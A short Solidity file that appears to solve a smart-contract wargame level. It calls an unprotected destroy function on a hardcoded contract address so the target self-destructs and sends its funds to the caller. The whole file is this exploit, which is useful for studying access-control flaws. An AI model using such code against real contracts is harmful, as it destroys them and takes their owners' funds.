// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract SimpleToken{
  function destroy(address payble) public {}
}

contract SimpleTokenDestroyer{
    SimpleToken originalContract = SimpleToken(0x6bDE28134b3398c8c16D19B80Cc5e0eCe219b249);
    function destroyOriginal() public {
        originalContract.destroy(msg.sender);
    }
}